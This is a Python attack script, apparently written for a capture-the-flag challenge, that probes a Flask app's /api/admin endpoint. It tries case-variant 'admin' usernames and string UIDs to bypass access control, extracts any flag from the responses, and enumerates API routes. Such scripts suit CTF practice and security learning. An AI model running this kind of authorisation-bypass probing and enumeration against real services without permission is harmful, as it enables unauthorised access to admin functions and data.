import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 最后的逻辑分析")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 用包含 "admin" 的用户直接访问 /api/admin
print("[*] 测试1: 用包含 'admin' 的用户访问 /api/admin")

test_users = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("eb0ffb79891641d789c50970f64aa263", "aDMin"),
    ("99803f00735243dab94fa2fd603e5330", "adminuser"),
    ("3b1ffc237a7e4c128cb266905beec204", "useradmin"),
]

for uid, username in test_users:
    print(f"    [-] {username} (UID: {uid})")
    
    # 直接访问 /api/admin
    admin_resp = session.post(f"{BASE_URL}/api/admin", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        POST /api/admin: {admin_resp.status_code}")
    print(f"        Response: {admin_resp.text}")
    
    if admin_resp.status_code != 403:
        print(f"        [!!!] 成功访问!")
        
        if "flag" in admin_resp.text.lower():
            print(f"        [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', admin_resp.text, re.IGNORECASE)
            if flag_match:
                print(f"        [!!!] Flag: {flag_match.group()}")

print()

# 测试2: 尝试用字符串形式的 UID
print("[*] 测试2: 尝试用字符串形式的 UID")

string_uids = [
    "admin",
    "administrator",
    "ADMiN",
    "aDMin",
]

for uid in string_uids:
    print(f"    [-] UID: {uid}")
    
    admin_resp = session.post(f"{BASE_URL}/api/admin", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        POST /api/admin: {admin_resp.status_code}")
    print(f"        Response: {admin_resp.text}")
    
    if admin_resp.status_code != 403:
        print(f"        [!!!] 成功访问!")
        if "flag" in admin_resp.text.lower():
            print(f"        [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', admin_resp.text, re.IGNORECASE)
            if flag_match:
                print(f"        [!!!] Flag: {flag_match.group()}")

print()

# 测试3: 检查所有 API 路由
print("[*] 测试3: 检查所有 API 路由")

api_routes = [
    "/api",
    "/api/",
    "/api/admin",
    "/api/backup",
    "/api/users",
    "/api/config",
]

for route in api_routes:
    # GET
    resp = session.get(f"{BASE_URL}{route}")
    print(f"    GET {route}: {resp.status_code}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"        {resp.text[:200]}")
    
    # POST
    resp = session.post(f"{BASE_URL}{route}")
    print(f"    POST {route}: {resp.status_code}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"        {resp.text[:200]}")

print()

print("[*] 测试完成")
